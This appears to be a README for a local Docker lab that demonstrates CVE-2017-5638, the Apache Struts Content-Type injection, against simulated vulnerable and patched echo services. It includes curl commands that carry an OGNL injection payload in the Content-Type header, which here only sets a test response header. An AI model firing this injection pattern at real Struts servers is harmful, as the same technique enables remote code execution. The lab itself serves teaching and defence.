CVE-2017-5638 demo


Prerequisites:
Docker and Docker Compose installed.
PowerShell (Windows) or bash (macOS/Linux).
Recommended: run inside an isolated VM and create a VM snapshot before the demo.

Start up Instructions:
Start services:
docker compose up -d

Confirm services:
docker ps
Expect entries for echo-vuln (0.0.0.0:5001->5000), echo-patched (0.0.0.0:5002->5000), webgoat (0.0.0.0:8080->8080)

Follow logs (in separate terminals)
docker logs -f echo-vuln
docker logs -f echo-patched

Safe demo commands (ONLY against local services)

PowerShell (use curl.exe to avoid alias issues):
curl.exe -v -X POST "http://localhost:5001
" `
-H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','pwned')}.multipart/form-data"

curl.exe -v -X POST "http://localhost:5002
" `
-H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','pwned')}.multipart/form-data"

Expected outputs:

echo-vuln (port 5001) returns:
{"message":"Simulated vulnerable echo",
"received_header":"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','pwned')}.multipart/form-data"}

echo-patched (port 5002) in reject mode returns:
HTTP/1.1 403 Forbidden
{"error":"Rejected suspicious payload (simulated patch)",
"reason":"suspicious token in header Content-Type"}


Stop & remove containers:
docker compose down
docker compose down --rmi local --volumes
